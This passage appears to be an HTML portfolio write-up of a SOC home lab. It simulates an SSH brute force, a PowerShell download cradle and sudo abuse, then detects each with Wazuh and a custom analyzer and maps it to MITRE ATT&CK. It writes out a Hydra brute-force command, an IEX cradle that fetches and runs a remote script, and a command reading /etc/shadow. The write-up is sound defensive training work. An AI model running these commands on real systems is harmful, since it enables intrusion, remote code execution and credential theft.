@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOC Lab Project — Automated Threat Detection & Incident Response Simulation | Mohamed Sabry</title>
+    <meta name="description" content="SOC Lab Project demonstrating end-to-end threat detection and incident response across SSH brute force, PowerShell download cradles, and privilege escalation scenarios using Wazuh SIEM and ThreatScope.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f8f9fc;
+            --bg-card: #ffffff;
+            --text-primary: #1a1d2e;
+            --text-secondary: #4a5068;
+            --text-muted: #8890a4;
+            --border: #e2e5f1;
+            --accent-navy: #0f172a;
+            --accent-blue: #2563eb;
+            --accent-blue-light: #dbeafe;
+            --accent-cyan: #06b6d4;
+            --accent-emerald: #10b981;
+            --accent-amber: #f59e0b;
+            --accent-red: #ef4444;
+            --accent-red-light: #fef2f2;
+            --accent-red-border: #fecaca;
+            --accent-amber-light: #fffbeb;
+            --accent-amber-border: #fde68a;
+            --accent-emerald-light: #ecfdf5;
+            --gradient-header: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --radius: 10px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-primary);
+            background: var(--bg-secondary);
+            line-height: 1.7;
+            font-size: 14px;
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+
+        .document {
+            max-width: 900px;
+            margin: 0 auto;
+            background: var(--bg-primary);
+            box-shadow: var(--shadow-md);
+        }
+
+        /* ── COVER HEADER ── */
+        .cover-header {
+            background: var(--gradient-header);
+            color: #ffffff;
+            padding: 60px 60px 50px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cover-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(37,99,235,0.15) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .cover-header::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -10%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(6,182,212,0.1) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .cover-header .label {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .cover-header h1 {
+            font-size: 32px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .cover-header .subtitle {
+            font-size: 17px;
+            font-weight: 300;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 36px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .meta-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .meta-item .meta-label {
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.4);
+            margin-bottom: 4px;
+        }
+
+        .meta-item .meta-value {
+            font-size: 14px;
+            font-weight: 500;
+            color: #ffffff;
+        }
+
+        /* ── TOOLS STRIP ── */
+        .tools-strip {
+            background: #1e293b;
+            padding: 20px 60px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .tools-strip .strip-label {
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.35);
+            margin-bottom: 10px;
+        }
+
+        .tools-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .tool-badge {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: rgba(255,255,255,0.8);
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* ── MAIN CONTENT ── */
+        .content {
+            padding: 50px 60px 60px;
+        }
+
+        .section {
+            margin-bottom: 44px;
+            page-break-inside: avoid;
+        }
+
+        .section-number {
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--accent-blue);
+            margin-bottom: 6px;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            line-height: 1.3;
+        }
+
+        h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+            margin-top: 28px;
+        }
+
+        h3:first-child {
+            margin-top: 0;
+        }
+
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 14px;
+            font-size: 14px;
+        }
+
+        /* ── TABLES ── */
+        .table-wrapper {
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin: 18px 0;
+            box-shadow: var(--shadow-sm);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        thead th {
+            background: var(--accent-navy);
+            color: #ffffff;
+            padding: 12px 16px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        tbody td {
+            padding: 11px 16px;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:nth-child(even) {
+            background: var(--bg-secondary);
+        }
+
+        /* ── CODE BLOCKS ── */
+        .code-block {
+            background: #0f172a;
+            color: #e2e8f0;
+            padding: 16px 20px;
+            border-radius: var(--radius);
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 13px;
+            margin: 14px 0;
+            overflow-x: auto;
+            line-height: 1.6;
+        }
+
+        .code-block .prompt {
+            color: var(--accent-cyan);
+            user-select: none;
+        }
+
+        .code-block .command {
+            color: #f1f5f9;
+        }
+
+        /* ── SEVERITY BADGES ── */
+        .severity-critical {
+            display: inline-block;
+            background: var(--accent-red);
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .severity-high {
+            display: inline-block;
+            background: var(--accent-amber);
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .severity-medium {
+            display: inline-block;
+            background: #8b5cf6;
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .severity-low {
+            display: inline-block;
+            background: var(--accent-emerald);
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* ── MITRE BADGE ── */
+        .mitre-id {
+            display: inline-block;
+            background: var(--accent-blue-light);
+            color: var(--accent-blue);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* ── METRIC CARDS ── */
+        .metric-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 14px;
+            margin: 18px 0;
+        }
+
+        .metric-card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 18px 20px;
+            text-align: center;
+        }
+
+        .metric-card .metric-value {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--accent-blue);
+            line-height: 1.2;
+        }
+
+        .metric-card .metric-value.critical {
+            color: var(--accent-red);
+        }
+
+        .metric-card .metric-label {
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* ── ALERT BOX ── */
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-blue);
+            border-radius: 0 var(--radius) var(--radius) 0;
+            padding: 16px 20px;
+            margin: 18px 0;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        /* ── FOOTER ── */
+        .footer {
+            background: var(--accent-navy);
+            color: rgba(255,255,255,0.5);
+            text-align: center;
+            padding: 24px 60px;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        .footer strong {
+            color: rgba(255,255,255,0.8);
+        }
+
+        /* ── SCREENSHOT FIGURES ── */
+        .screenshot {
+            margin: 24px 0;
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow-md);
+        }
+
+        .screenshot img {
+            width: 100%;
+            display: block;
+        }
+
+        .screenshot figcaption {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            padding: 10px 16px;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-muted);
+            text-align: center;
+        }
+
+        .screenshot figcaption strong {
+            color: var(--text-primary);
+        }
+
+        /* ── PRINT ── */
+        @media print {
+            body { background: #fff; }
+            .document { box-shadow: none; max-width: 100%; }
+            .cover-header { padding: 40px 50px 36px; }
+            .content { padding: 36px 50px 40px; }
+            .section { page-break-inside: avoid; }
+            h2 { page-break-after: avoid; }
+            .table-wrapper { page-break-inside: avoid; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="document">
+
+    <!-- ═══════════ COVER HEADER ═══════════ -->
+    <header class="cover-header">
+        <div class="label">Portfolio Project</div>
+        <h1>SOC Lab Project</h1>
+        <div class="subtitle">Automated Threat Detection &amp; Incident Response Simulation</div>
+
+        <div class="meta-grid">
+            <div class="meta-item">
+                <div class="meta-label">Author</div>
+                <div class="meta-value">Mohamed Sabry (0xSABRY)</div>
+            </div>
+            <div class="meta-item">
+                <div class="meta-label">Role</div>
+                <div class="meta-value">SOC Analyst | DFIR</div>
+            </div>
+            <div class="meta-item">
+                <div class="meta-label">Date</div>
+                <div class="meta-value">March 2026</div>
+            </div>
+            <div class="meta-item">
+                <div class="meta-label">Classification</div>
+                <div class="meta-value">Lab / Portfolio Project</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- ═══════════ TOOLS STRIP ═══════════ -->
+    <div class="tools-strip">
+        <div class="strip-label">Tools Used</div>
+        <div class="tools-list">
+            <span class="tool-badge">Wazuh SIEM</span>
+            <span class="tool-badge">ThreatScope (Custom Tool)</span>
+            <span class="tool-badge">Hydra</span>
+            <span class="tool-badge">Ubuntu Server 24.04 LTS</span>
+            <span class="tool-badge">VirtualBox / VMware Workstation</span>
+        </div>
+    </div>
+
+    <!-- ═══════════ MAIN CONTENT ═══════════ -->
+    <div class="content">
+
+        <!-- ── 1. PROJECT OVERVIEW ── -->
+        <section class="section">
+            <div class="section-number">Section 01</div>
+            <h2>Project Overview</h2>
+            <p>This project demonstrates the end-to-end workflow of a Security Operations Center (SOC) Tier 1 analyst — from attack simulation to detection, analysis, and response. The lab replicates a real-world monitored environment using open-source tools, a custom threat detection engine (ThreatScope), and a SIEM platform (Wazuh).</p>
+            <p>Three distinct attack scenarios were executed against a live Ubuntu Server endpoint. Each scenario was detected, triaged, and mapped to the MITRE ATT&amp;CK framework. ThreatScope was used to perform deep log analysis on Windows Event Logs captured during the attacks, producing STIX 2.1 threat intelligence bundles and JSON reports.</p>
+
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Objective</th><th>Details</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Detection Coverage</strong></td><td>Monitor endpoint activity using Wazuh agent on Ubuntu Server</td></tr>
+                        <tr><td><strong>Threat Analysis</strong></td><td>Analyze Windows Event Logs with ThreatScope custom engine</td></tr>
+                        <tr><td><strong>MITRE Mapping</strong></td><td>Map all detected activity to ATT&amp;CK tactics and techniques</td></tr>
+                        <tr><td><strong>Threat Intel Export</strong></td><td>Generate STIX 2.1 bundles and JSON IOC reports</td></tr>
+                        <tr><td><strong>Incident Response</strong></td><td>Document findings and remediation steps per scenario</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 2. LAB ENVIRONMENT SETUP ── -->
+        <section class="section">
+            <div class="section-number">Section 02</div>
+            <h2>Lab Environment Setup</h2>
+            <p>The lab environment consists of three virtual machines running on VirtualBox and VMware Workstation, all connected on the same bridged network segment (192.168.1.0/24). ThreatScope runs natively on the Windows host machine.</p>
+
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Component</th><th>Details</th><th>IP Address</th><th>Role</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Wazuh SIEM</strong></td><td>OVA v4.14.4 / VirtualBox</td><td><code>192.168.1.8</code></td><td>SIEM Manager + Dashboard</td></tr>
+                        <tr><td><strong>Ubuntu Server</strong></td><td>Ubuntu 24.04 LTS / VMware</td><td><code>192.168.1.9</code></td><td>Victim Endpoint</td></tr>
+                        <tr><td><strong>Windows Host</strong></td><td>Windows 10/11</td><td><code>192.168.1.7</code></td><td>Attacker + ThreatScope</td></tr>
+                        <tr><td><strong>WSL (Ubuntu)</strong></td><td>Debian-based WSL2</td><td><code>172.20.144.x</code></td><td>Attack Tools (Hydra)</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="info-box">
+                The Wazuh Agent was installed on Ubuntu Server and successfully connected to the Wazuh Manager. The agent (ID: 001, Name: 0xsabry) was verified as <strong>Active</strong> in the Wazuh Endpoints dashboard prior to executing any attack scenarios.
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image1.png" alt="Wazuh Agent Dashboard — 0xsabry endpoint">
+                <figcaption><strong>Figure 2.1</strong> — Wazuh Endpoints Dashboard showing agent 0xsabry (ID: 001) as Active on Ubuntu 24.04.4 LTS with system inventory, MITRE ATT&amp;CK coverage, and compliance status</figcaption>
+            </figure>
+        </section>
+
+        <!-- ── 3. SCENARIO 1 — SSH BRUTE FORCE ── -->
+        <section class="section">
+            <div class="section-number">Section 03</div>
+            <h2>Scenario 1 — SSH Brute Force Attack</h2>
+
+            <h3>3.1 Attack Description</h3>
+            <p>A dictionary-based SSH brute force attack was launched from the WSL environment against the Ubuntu Server endpoint using Hydra v9.5. The attack targeted the root account using the <code>rockyou.txt</code> wordlist with 4 parallel threads.</p>
+            <div class="code-block">
+                <span class="prompt">$ </span><span class="command">hydra -l root -P /root/rockyou.txt ssh://192.168.1.9 -t 4 -V</span>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image2.png" alt="Hydra brute force attack execution">
+                <figcaption><strong>Figure 3.1</strong> — Hydra v9.5 SSH brute force attack launched from WSL terminal against 192.168.1.9 using rockyou.txt wordlist</figcaption>
+            </figure>
+
+            <h3>3.2 Detection — Wazuh SIEM</h3>
+            <p>Wazuh detected the brute force activity in real time through the agent running on the victim endpoint. A total of <strong>339 security events</strong> were generated within minutes of the attack commencing.</p>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Rule ID</th><th>Description</th><th>Severity</th><th>Count</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>40111</strong></td><td>Multiple authentication failures</td><td><span class="severity-critical">Level 10</span></td><td>~150+</td></tr>
+                        <tr><td><strong>5758</strong></td><td>Maximum authentication attempts exceeded</td><td><span class="severity-high">Level 8</span></td><td>~80+</td></tr>
+                        <tr><td><strong>2502</strong></td><td>User missed the password more than once</td><td><span class="severity-critical">Level 10</span></td><td>~60+</td></tr>
+                        <tr><td><strong>2501</strong></td><td>User authentication failure</td><td><span class="severity-medium">Level 5</span></td><td>~40+</td></tr>
+                        <tr><td><strong>5760</strong></td><td>sshd: authentication failed</td><td><span class="severity-medium">Level 5</span></td><td>~30+</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image3.png" alt="Wazuh Threat Hunting — 339 SSH brute force events">
+                <figcaption><strong>Figure 3.2</strong> — Wazuh Threat Hunting Events showing 339 hits from the SSH brute force attack, including rule IDs 40111, 2502, 5758, 2501, and 5760</figcaption>
+            </figure>
+
+            <h3>3.3 MITRE ATT&amp;CK Mapping</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Technique ID</th><th>Name</th><th>Tactic</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="mitre-id">T1110</span></td><td>Brute Force</td><td>Credential Access</td></tr>
+                        <tr><td><span class="mitre-id">T1110.001</span></td><td>Password Guessing</td><td>Credential Access</td></tr>
+                        <tr><td><span class="mitre-id">T1021.004</span></td><td>SSH</td><td>Lateral Movement</td></tr>
+                        <tr><td><span class="mitre-id">T1078</span></td><td>Valid Accounts</td><td>Defense Evasion / Initial Access</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image4.png" alt="Wazuh MITRE ATT&CK Dashboard — all tactics">
+                <figcaption><strong>Figure 3.3</strong> — Wazuh MITRE ATT&amp;CK Dashboard showing alerts evolution, top tactics (Credential Access: 108, Lateral Movement: 70), and rule level distributions</figcaption>
+            </figure>
+
+            <figure class="screenshot">
+                <img src="images/image5.png" alt="Wazuh MITRE ATT&CK — Lateral Movement filter">
+                <figcaption><strong>Figure 3.4</strong> — Wazuh MITRE ATT&amp;CK Dashboard filtered by Lateral Movement tactic, showing Password Guessing and SSH technique distribution</figcaption>
+            </figure>
+
+            <h3>3.4 Incident Response Actions</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Action</th><th>Details</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Alert Triage</strong></td><td>Identified source of brute force — WSL host (192.168.1.7)</td></tr>
+                        <tr><td><strong>Impact Assessment</strong></td><td>No successful authentication — attack contained</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Implement fail2ban or UFW rate limiting on SSH port 22</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Disable root SSH login in <code>/etc/ssh/sshd_config</code></td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Enforce SSH key-based authentication only</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 4. SCENARIO 2 — POWERSHELL DOWNLOAD CRADLE ── -->
+        <section class="section">
+            <div class="section-number">Section 04</div>
+            <h2>Scenario 2 — PowerShell Malicious Download Cradle</h2>
+
+            <h3>4.1 Attack Description</h3>
+            <p>A PowerShell-based download cradle was executed on the Windows host using the IEX (Invoke-Expression) technique — a common fileless malware delivery method. The command attempted to download and execute a remote PowerShell script from the Ubuntu Server. Although the connection failed (no server running), the execution attempt was fully logged in the Windows PowerShell Operational Event Log.</p>
+            <div class="code-block">
+                <span class="prompt">PS&gt; </span><span class="command">IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.9/test.ps1')</span>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image6.png" alt="PowerShell IEX download cradle execution">
+                <figcaption><strong>Figure 4.1</strong> — PowerShell IEX download cradle executed on Windows host, followed by wevtutil export of operational logs for ThreatScope analysis</figcaption>
+            </figure>
+
+            <h3>4.2 Analysis — ThreatScope v3.0.0</h3>
+            <p>Windows PowerShell Operational logs were exported using <code>wevtutil</code> and analyzed by ThreatScope. The engine processed <strong>1,008 log lines</strong> using <strong>144 detection rules</strong> and <strong>1 Sigma rule</strong>, producing a CRITICAL threat assessment.</p>
+
+            <div class="metric-row">
+                <div class="metric-card">
+                    <div class="metric-value critical">100%</div>
+                    <div class="metric-label">Threat Score — Critical</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value">8 / 144</div>
+                    <div class="metric-label">Rules Triggered</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value">8</div>
+                    <div class="metric-label">MITRE Techniques</div>
+                </div>
+                <div class="metric-card">
+                    <div class="metric-value">16</div>
+                    <div class="metric-label">IOCs Extracted</div>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <strong>Key IOC:</strong> <code>http://192.168.1.9/test.ps1</code> — malicious download URL. Total IOCs: 1 IP, 5 domains, 10 URLs.
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image7.png" alt="ThreatScope v3.0.0 GUI — Ready state">
+                <figcaption><strong>Figure 4.2</strong> — ThreatScope v3.0.0 GUI in ready state — 143 Detection Rules loaded across 24 Categories</figcaption>
+            </figure>
+
+            <figure class="screenshot">
+                <img src="images/image8.png" alt="ThreatScope analysis — powershell_logs.evtx">
+                <figcaption><strong>Figure 4.3</strong> — ThreatScope full report for powershell_logs.evtx: 100% CRITICAL threat score, 1,008 lines analyzed, 8 rules triggered, 8 MITRE techniques, 16 IOCs extracted</figcaption>
+            </figure>
+
+            <h3>4.3 Key Findings</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Severity</th><th>Finding</th><th>MITRE ID</th><th>Hits</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="severity-critical">CRITICAL</span></td><td>Reverse shell command detected</td><td><span class="mitre-id">T1059</span></td><td>96</td></tr>
+                        <tr><td><span class="severity-critical">CRITICAL</span></td><td>Web shell detected on server</td><td><span class="mitre-id">T1505.003</span></td><td>5</td></tr>
+                        <tr><td><span class="severity-critical">CRITICAL</span></td><td>Exploit kit activity detected</td><td><span class="mitre-id">T1203</span></td><td>1</td></tr>
+                        <tr><td><span class="severity-high">HIGH</span></td><td>Command obfuscation (Base64/IEX)</td><td><span class="mitre-id">T1027</span></td><td>6</td></tr>
+                        <tr><td><span class="severity-high">HIGH</span></td><td>Tor network usage detected</td><td><span class="mitre-id">T1090.003</span></td><td>1</td></tr>
+                        <tr><td><span class="severity-high">HIGH</span></td><td>Alternate Data Stream (ADS)</td><td><span class="mitre-id">T1564.004</span></td><td>22</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image9.png" alt="ThreatScope findings — Defense Evasion, Discovery, Malware categories">
+                <figcaption><strong>Figure 4.4</strong> — ThreatScope findings by category: Defense Evasion (ADS T1564.004, Obfuscation T1027), Discovery (T1087.001, T1082), Malware (Web Shell T1505.003), and Zero-Day/Exploit (T1203)</figcaption>
+            </figure>
+
+            <figure class="screenshot">
+                <img src="images/image10.png" alt="ThreatScope IOCs and MITRE ATT&CK coverage">
+                <figcaption><strong>Figure 4.5</strong> — ThreatScope IOC extraction: 5 domains, 1 IPv4, 10 URLs including malicious http://192.168.1.9/test.ps1 — with full MITRE ATT&amp;CK coverage table</figcaption>
+            </figure>
+
+            <figure class="screenshot">
+                <img src="images/image11.png" alt="ThreatScope recommendations and report footer">
+                <figcaption><strong>Figure 4.6</strong> — ThreatScope recommendations: block C2 IPs/domains, urgent web shell remediation — 144 detection rules, 25 categories</figcaption>
+            </figure>
+
+            <h3>4.4 Incident Response Actions</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Action</th><th>Details</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Alert Triage</strong></td><td>Identified IEX download cradle targeting <code>192.168.1.9/test.ps1</code></td></tr>
+                        <tr><td><strong>IOC Extraction</strong></td><td>16 IOCs extracted including malicious URL and suspicious domains</td></tr>
+                        <tr><td><strong>STIX Export</strong></td><td>Threat intel bundle generated for sharing with threat intel platforms</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Restrict PowerShell execution policy: <code>Set-ExecutionPolicy RemoteSigned</code></td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Enable PowerShell Script Block Logging (Event ID 4104)</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Deploy AppLocker or WDAC to block unauthorized script execution</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 5. SCENARIO 3 — PRIVILEGE ESCALATION ── -->
+        <section class="section">
+            <div class="section-number">Section 05</div>
+            <h2>Scenario 3 — Privilege Escalation (Sudo Abuse)</h2>
+
+            <h3>5.1 Attack Description</h3>
+            <p>Privilege escalation techniques were simulated on the Ubuntu Server by enumerating sudo permissions and accessing sensitive system files. These actions represent common post-exploitation steps taken by attackers after gaining initial access to a Linux endpoint.</p>
+            <div class="code-block">
+                <span class="prompt">$ </span><span class="command">sudo -l</span>                           <span style="color:#64748b"># Enumerate sudo privileges</span><br>
+                <span class="prompt">$ </span><span class="command">sudo cat /etc/shadow</span>              <span style="color:#64748b"># Access sensitive credentials file</span>
+            </div>
+
+            <h3>5.2 Detection — Wazuh SIEM</h3>
+            <p>Wazuh detected all privilege escalation activity through the installed agent. A total of <strong>407 events</strong> were recorded, with critical alerts for sudo-to-root execution and first-time sudo usage flagged immediately.</p>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Rule ID</th><th>Description</th><th>Severity</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>5402</strong></td><td>Successful sudo to ROOT executed</td><td><span class="severity-low">Level 3</span></td></tr>
+                        <tr><td><strong>5403</strong></td><td>First time user executed sudo</td><td><span class="severity-low">Level 4</span></td></tr>
+                        <tr><td><strong>5501</strong></td><td>PAM: Login session opened</td><td><span class="severity-low">Level 3</span></td></tr>
+                        <tr><td><strong>5502</strong></td><td>PAM: Login session closed</td><td><span class="severity-low">Level 3</span></td></tr>
+                        <tr><td><strong>40111</strong></td><td>Multiple authentication failures (residual)</td><td><span class="severity-critical">Level 10</span></td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image12.png" alt="Wazuh Threat Hunting — 407 privilege escalation events">
+                <figcaption><strong>Figure 5.1</strong> — Wazuh Threat Hunting Events showing 407 hits including sudo-to-ROOT (5402), first-time sudo (5403), and PAM session events for agent 0xsabry</figcaption>
+            </figure>
+
+            <h3>5.3 MITRE ATT&amp;CK Mapping</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Technique ID</th><th>Name</th><th>Tactic</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="mitre-id">T1548.003</span></td><td>Sudo and Sudo Caching</td><td>Privilege Escalation</td></tr>
+                        <tr><td><span class="mitre-id">T1087.001</span></td><td>Local Account Discovery</td><td>Discovery</td></tr>
+                        <tr><td><span class="mitre-id">T1552.001</span></td><td>Credentials In Files (/etc/shadow)</td><td>Credential Access</td></tr>
+                        <tr><td><span class="mitre-id">T1078.003</span></td><td>Valid Accounts: Local Accounts</td><td>Defense Evasion</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <figure class="screenshot">
+                <img src="images/image13.png" alt="Wazuh MITRE ATT&CK — Privilege Escalation filter">
+                <figcaption><strong>Figure 5.2</strong> — Wazuh MITRE ATT&amp;CK Dashboard filtered by Privilege Escalation tactic, showing Sudo and Sudo Caching / Valid Accounts techniques with tactic distribution charts</figcaption>
+            </figure>
+
+            <h3>5.4 Incident Response Actions</h3>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Action</th><th>Details</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Alert Triage</strong></td><td>Root execution via sudo confirmed — user sabry on 0xsabry host</td></tr>
+                        <tr><td><strong>Impact Assessment</strong></td><td>Sensitive file <code>/etc/shadow</code> accessed — potential credential exposure</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Restrict <code>/etc/shadow</code> access: <code>chmod 640 /etc/shadow</code></td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Audit sudoers file — remove unnecessary sudo privileges</td></tr>
+                        <tr><td><strong>Recommendation</strong></td><td>Enable auditd for comprehensive privilege escalation monitoring</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 6. OVERALL MITRE COVERAGE ── -->
+        <section class="section">
+            <div class="section-number">Section 06</div>
+            <h2>Overall MITRE ATT&amp;CK Coverage</h2>
+            <p>Across all three scenarios, the combined detection pipeline (Wazuh + ThreatScope) identified activity mapped to <strong>12 distinct MITRE ATT&amp;CK techniques</strong> spanning <strong>6 tactics</strong>.</p>
+
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Technique ID</th><th>Name</th><th>Tactic</th><th>Source</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="mitre-id">T1110 / T1110.001</span></td><td>Brute Force / Password Guessing</td><td>Credential Access</td><td>Wazuh</td></tr>
+                        <tr><td><span class="mitre-id">T1021.004</span></td><td>Remote Services: SSH</td><td>Lateral Movement</td><td>Wazuh</td></tr>
+                        <tr><td><span class="mitre-id">T1078</span></td><td>Valid Accounts</td><td>Defense Evasion</td><td>Wazuh</td></tr>
+                        <tr><td><span class="mitre-id">T1548.003</span></td><td>Sudo and Sudo Caching</td><td>Privilege Escalation</td><td>Wazuh</td></tr>
+                        <tr><td><span class="mitre-id">T1059</span></td><td>Command &amp; Scripting Interpreter</td><td>Execution</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1027</span></td><td>Obfuscated Files (Base64/IEX)</td><td>Defense Evasion</td><td>ThreatScope</td></tr>
